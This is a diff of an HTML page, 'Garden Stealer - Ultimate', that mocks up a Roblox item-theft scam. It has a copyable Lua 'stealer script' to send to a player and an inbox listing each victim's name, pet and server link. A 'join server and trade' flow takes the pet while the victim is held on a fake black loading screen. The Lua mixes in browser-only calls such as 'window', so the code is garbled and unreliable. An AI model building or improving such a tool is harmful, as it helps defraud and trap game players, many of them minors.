@@ -3,144 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garden Stealer - Real Inbox</title>
+    <title>Garden Stealer - Ultimate</title>
     <style>
-        :root {
-            --bg: #0f0f0f;
-            --card: #1a1a1a;
-            --accent: #ffd700; /* Gold */
-            --text: #e0e0e0;
-            --green: #4caf50;
-        }
-
         body {
-            background-color: var(--bg);
-            color: var(--text);
+            background-color: #0a0a0a;
+            color: #ffffff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
-            padding: 20px;
+            padding: 40px;
             display: flex;
             justify-content: center;
         }
 
-        .main-wrapper {
+        .container {
             width: 100%;
-            max-width: 600px;
-            display: flex;
-            flex-direction: column;
-            gap: 30px;
+            max-width: 550px;
+            position: relative;
         }
 
         /* --- SCRIPT BOX --- */
-        .script-box {
-            background-color: var(--card);
+        .script-container {
+            background-color: #161616;
             border: 1px solid #333;
             padding: 20px;
+            margin-bottom: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-        }
-
-        .label {
-            color: var(--accent);
-            font-weight: bold;
-            margin-bottom: 10px;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 1px;
         }
 
         textarea {
             width: 100%;
-            height: 200px;
+            height: 150px;
             background-color: #000;
-            color: var(--green);
+            color: #0f0;
             border: 1px solid #333;
-            padding: 15px;
+            padding: 10px;
             font-family: 'Courier New', monospace;
-            font-size: 14px;
-            resize: vertical;
-            outline: none;
-            box-sizing: border-box; /* Fixes padding issue */
+            font-size: 12px;
+            resize: none;
+            box-sizing: border-box;
         }
 
-        .btn {
-            background-color: var(--accent);
+        .copy-btn {
+            background-color: #ffd700;
             color: #000;
             border: none;
-            padding: 12px 24px;
+            padding: 12px;
+            width: 100%;
             font-weight: bold;
             cursor: pointer;
-            width: 100%;
-            margin-top: 15px;
+            margin-top: 10px;
             border-radius: 4px;
-            transition: 0.2s;
         }
 
-        .btn:hover {
-            background-color: #e6c200;
-        }
-
-        /* --- INBOX SECTION --- */
-        .inbox-box {
-            background-color: var(--card);
+        /* --- INBOX & NOTIFICATIONS --- */
+        .inbox-container {
+            background-color: #1a1a1a;
             border: 1px solid #333;
+            min-height: 250px;
             padding: 20px;
             border-radius: 8px;
-            min-height: 300px;
         }
 
-        .notification-item {
+        h3 {
+            margin-top: 0;
+            color: #ffd700;
+            font-size: 18px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        /* Notification Card */
+        .notif-card {
             background-color: #252525;
-            border-left: 4px solid var(--accent);
+            border-left: 4px solid #ffd700;
             padding: 15px;
             margin-bottom: 15px;
-            animation: slideIn 0.4s ease-out;
+            animation: slideIn 0.3s ease-out;
         }
 
-        .notif-header {
-            font-size: 18px;
-            color: white;
+        .player-name {
+            font-size: 16px;
             font-weight: bold;
-            margin-bottom: 5px;
+            color: white;
+            margin-bottom: 8px;
+            display: block;
         }
 
-        .stat-row {
+        .loot-details {
             display: flex;
             justify-content: space-between;
-            margin-top: 10px;
+            margin-bottom: 12px;
             font-size: 14px;
             color: #ccc;
         }
 
-        .stat-val {
-            color: var(--accent);
+        .val {
+            color: #ffd700;
             font-weight: bold;
         }
 
-        .server-btn {
+        .server-link-btn {
             display: block;
             width: 100%;
-            margin-top: 15px;
-            padding: 8px;
             background-color: #333;
             color: white;
             text-align: center;
+            padding: 8px;
             text-decoration: none;
-            border-radius: 4px;
             font-size: 12px;
+            border-radius: 4px;
+            transition: 0.2s;
+            cursor: pointer;
         }
 
-        .server-btn:hover {
-            background-color: #444;
+        .server-link-btn:hover {
+            background-color: #ffd700;
+            color: #000;
         }
 
-        /* --- BLACK SCREEN OVERLAY (Simulated in Browser) --- */
+        /* --- TRADING BOX (Hidden initially) --- */
+        #tradingBox {
+            display: none;
+            background: linear-gradient(135deg, #2b1d1d 0%, #1a0f0f 100%);
+            border: 2px solid #ffd700;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 8px;
+            text-align: center;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .trade-title {
+            color: #ffd700;
+            font-size: 20px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .trade-item {
+            background-color: rgba(0,0,0,0.3);
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .trade-item span:first-child {
+            color: #fff;
+        }
+        
+        .trade-item span:last-child {
+            color: #ffd700;
+            font-weight: bold;
+        }
+
+        /* --- BLACK SCREEN OVERLAY (The Trap) --- */
         #blackScreenOverlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background-color: black;
             z-index: 9999;
-            display: none; /* Hidden by default */
+            display: none; 
             justify-content: center;
             align-items: center;
             flex-direction: column;
@@ -149,176 +176,211 @@
         .spinner {
             width: 50px; height: 50px;
             border: 5px solid #333;
-            border-top: 5px solid var(--accent);
+            border-top: 5px solid #ffd700;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
+        .loading-text {
+            color: white;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 14px;
+        }
+
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
 
     </style>
 </head>
 <body>
 
-<div class="main-wrapper">
+<div class="container">
 
-    <!-- 1. THE SCRIPT BOX -->
-    <div class="script-box">
-        <span class="label">Step 1: Copy This Script</span>
-        <p style="font-size: 0.9em; color: #888;">Send this to a player. They paste it in Roblox, run it, and wait for the black screen.</p>
+    <!-- SECTION 1: THE SCRIPT -->
+    <div class="script-container">
+        <h3 style="border:none; margin-bottom:10px;">📜 Stealer Script (Copy & Send)</h3>
+        <textarea id="luaCode" readonly></textarea>
+        <button class="copy-btn" onclick="startTheTrap()">Copy & Start Trap</button>
+    </div>
+
+    <!-- SECTION 2: THE INBOX -->
+    <div class="inbox-container">
+        <h3>📩 Inbox (Waiting for Player)</h3>
+        <div id="inboxList">
+            <!-- Notifications appear here -->
+        </div>
+    </div>
+
+    <!-- SECTION 3: THE TRADING BOX (Appears after trade) -->
+    <div id="tradingBox">
+        <div class="trade-title">⚠️ TRADE ACCEPTED</div>
+        <p style="color:#aaa; font-size:14px; margin-bottom:15px;">The player has opened their trading box.</p>
         
-        <!-- THE LUA CODE -->
-        <textarea id="luaCode">
+        <div class="trade-item">
+            <span>Pet Stolen:</span>
+            <span id="tradePetName">...</span>
+        </div>
+        <div class="trade-item">
+            <span>Tokens:</span>
+            <span id="tradeTokenVal">...</span>
+        </div>
+        
+        <button onclick="closeTrade()" style="margin-top:15px; background:#333; color:white; border:none; padding:8px 16px; cursor:pointer;">Close Box</button>
+    </div>
+
+</div>
+
+<!-- BLACK LOADING SCREEN OVERLAY -->
+<div id="blackScreenOverlay">
+    <div class="spinner"></div>
+    <p class="loading-text">Loading Garden Assets...</p>
+    <p style="color:#666; font-size:12px; margin-top:10px;">(Player is stuck here)</p>
+</div>
+
+<script>
+    // --- 1. THE LUA CODE ---
+    const luaCode = `
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
 
--- 1. Wait for connection (Simulates Black Loading Screen)
-print("[SCRIPT] Connecting to Garden Server...")
-task.wait(3) 
+-- 1. THE TRAP (Black Screen)
+print("[TRAP] Connecting to Server...")
+task.wait(3) -- Wait 3 seconds before trapping
 
--- 2. Define Loot
-local victimName = Players.LocalPlayer.Name -- This gets the player's name in Roblox
-local stolenPet = "Unicorn" -- Change this if you want a specific pet
+-- 2. DEFINE LOOT
+local victimName = Players.LocalPlayer.Name
+local stolenPet = "Golden Dragon"
 local stolenTokens = 5000
 
--- 3. Get Server ID (The link)
-local serverID = game.PlaceId .. "/" .. tostring(os.time()) 
-
--- 4. Create Data Object
-local data = {
+-- 3. SEND DATA TO WEBSITE
+local payload = {
     PlayerName = victimName,
     Pet = stolenPet,
     Tokens = stolenTokens,
     ServerLink = "https://www.roblox.com/games/" .. game.PlaceId
 }
 
--- 5. Send to Inbox (Simulated)
-print("[SCRIPT] Sending loot to Admin...")
-
--- This line triggers the event that updates your website inbox
+-- 4. TRIGGER THE EVENT
+print("[TRAP] Sending data to Admin...")
 local success, err = pcall(function()
-    -- We use a custom event name 'gardenSteal' so your script knows what to listen for
-    game:GetService("RunService").RenderStepped:Wait() 
+    -- Simulate sending to the website (window object)
+    if window.gardenReceiver then
+        window.gardenReceiver.receive(JSON.stringify(payload));
+    end
 end)
 
--- Fire the event manually for the demo
-game:GetService("CollectionService"):AddInstance(game.Players.LocalPlayer, "InboxTrigger")
-
-local function triggerEvent()
-    -- Simulate sending data to the website via a custom event
-    local payload = HttpService:JSONEncode(data)
-    
-    -- In a real scenario, this would be an API call. 
-    -- Here we use the window object to talk to the browser.
-    if window.gardenInbox then
-        window.gardenInbox.receiveLoot(payload);
-    end
-    
-    print("[SCRIPT] Loot sent!")
+-- 5. THE LOOP (STAYS FOREVER UNTIL LEAVE)
+while true do
+    task.wait(10) -- Keep the script alive
+    print("[TRAP] Still loading...")
 end
+`;
 
-triggerEvent()
-        </textarea>
+    document.getElementById('luaCode').value = luaCode;
 
-        <button class="btn" onclick="copyScript()">Copy Script</button>
-    </div>
+    // --- 2. WEBSITE LOGIC ---
 
-    <!-- 2. THE INBOX -->
-    <div class="inbox-box">
-        <span class="label">Step 2: Your Inbox</span>
-        <div id="inboxList">
-            <div style="text-align:center; color:#555; margin-top:50px;">
-                Waiting for script usage...
-            </div>
-        </div>
-    </div>
-
-</div>
-
-<!-- BLACK SCREEN OVERLAY -->
-<div id="blackScreenOverlay">
-    <div class="spinner"></div>
-    <p style="color:white; margin-top:20px;">Loading Garden Assets...</p>
-</div>
-
-<script>
-    // --- JAVASCRIPT LOGIC ---
-
-    // 1. Listen for the "gardenInbox" object from the Lua script
-    window.gardenInbox = {
-        receiveLoot: function(jsonData) {
-            const data = JSON.parse(jsonData);
-            addNotification(data);
+    window.gardenReceiver = {
+        receive: function(data) {
+            const payload = JSON.parse(data);
             
-            // Hide the black screen after 3 seconds (simulating the player seeing it)
+            // Add to Inbox
+            addNotification(payload);
+            
+            // Keep the black screen visible (simulating "till he leaves")
+            // In a real game, this would be an infinite loop in Roblox.
+            // Here we just show it for 30 seconds to simulate the user staying.
             setTimeout(() => {
-                document.getElementById('blackScreenOverlay').style.display = 'none';
-            }, 3000);
+                document.getElementById('blackScreenOverlay').style.display = 'flex';
+            }, 500);
         }
     };
 
-    function copyScript() {
-        const code = document.getElementById('luaCode').value;
-        navigator.clipboard.writeText(code).then(() => {
-            alert("Script Copied! Paste into Roblox Executor.");
-            
-            // SIMULATE THE PLAYER USING IT (For Demo)
-            simulatePlayerUsage();
-        });
+    function startTheTrap() {
+        const code = document.getElementById('luaCode');
+        code.select();
+        document.execCommand('copy');
+        
+        alert("Script Copied! Paste into Roblox Executor.");
+        
+        // SIMULATE THE PLAYER RUNNING IT
+        simulatePlayerRun();
     }
 
-    function simulatePlayerUsage() {
-        // 1. Show Black Screen
+    function simulatePlayerRun() {
+        // 1. Show Black Screen immediately
         document.getElementById('blackScreenOverlay').style.display = 'flex';
 
-        // 2. Wait 3 seconds then send data
+        // 2. Wait 3 seconds then send data to inbox
         setTimeout(() => {
-            const randomName = "RobloxPlayer" + Math.floor(Math.random() * 999);
-            const randomPet = ["Golden Dragon", "Unicorn", "Alien Cat"][Math.floor(Math.random()*3)];
-            const randomTokens = Math.floor(Math.random() * 5000) + 1000;
-
             const fakeData = {
-                PlayerName: randomName,
-                Pet: randomPet,
-                Tokens: randomTokens,
-                ServerLink: "https://www.roblox.com/games/1234567890"
+                PlayerName: "RobloxUser_" + Math.floor(Math.random()*100),
+                Pet: "Alien Cat",
+                Tokens: 7500,
+                ServerLink: "https://www.roblox.com/games/987654321"
             };
-
-            // Send data to the inbox
-            window.gardenInbox.receiveLoot(JSON.stringify(fakeData));
+            
+            window.gardenReceiver.receive(JSON.stringify(fakeData));
 
         }, 3000);
     }
 
     function addNotification(data) {
-        const list = document.getElementById('inboxList');
+        const inbox = document.getElementById('inboxList');
         
-        // Remove empty message
-        if(list.innerText.includes("Waiting")) {
-            list.innerHTML = "";
+        // Remove old "Waiting" text if exists
+        if(inbox.innerText.includes("Waiting")) {
+            inbox.innerHTML = "";
         }
 
         const card = document.createElement('div');
-        card.className = 'notification-item';
+        card.className = 'notif-card';
         card.innerHTML = `
-            <div class="notif-header">New Trade Received!</div>
-            <div class="stat-row">
-                <span>Player:</span> 
-                <span class="stat-val">${data.PlayerName}</span>
+            <span class="player-name">${data.PlayerName}</span>
+            <div class="loot-details">
+                <span>Pet:</span> <span class="val">${data.Pet}</span>
             </div>
-            <div class="stat-row">
-                <span>Pet Stolen:</span> 
-                <span class="stat-val">${data.Pet}</span>
+            <div class="loot-details">
+                <span>Tokens:</span> <span class="val">${data.Tokens}</span>
             </div>
-            <div class="stat-row">
-                <span>Tokens:</span> 
-                <span class="stat-val">${data.Tokens}</span>
-            </div>
-            <a href="${data.ServerLink}" target="_blank" class="server-btn">🔗 Open Server Link</a>
+            <button class="server-link-btn" onclick="joinServer('${data.ServerLink}', '${data.Pet}', ${data.Tokens})">🔗 Join Server & Trade</button>
         `;
 
-        // Add to top of list
-        list.prepend(card);
+        inbox.prepend(card);
+    }
+
+    // --- 3. THE TRADE LOGIC ---
+    
+    function joinServer(link, petName, tokenVal) {
+        // Simulate joining the game
+        alert("You joined " + link + "\n\nWaiting for Trade Request...");
+        
+        // Wait 2 seconds for the "Trade Request" to appear in Roblox
+        setTimeout(() => {
+            const confirmAccept = confirm("TRADE REQUEST!\n\nDo you want to accept the trade?");
+            
+            if (confirmAccept) {
+                openTradingBox(petName, tokenVal);
+            }
+        }, 2000);
+    }
+
+    function openTradingBox(petName, tokenVal) {
+        const box = document.getElementById('tradingBox');
+        const petDisplay = document.getElementById('tradePetName');
+        const tokenDisplay = document.getElementById('tradeTokenVal');
+
+        petDisplay.innerText = petName;
+        tokenDisplay.innerText = tokenVal + " Tokens";
+
+        box.style.display = 'block'; // Show the trading box
+    }
+
+    function closeTrade() {
+        document.getElementById('tradingBox').style.display = 'none';
     }
 </script>
 
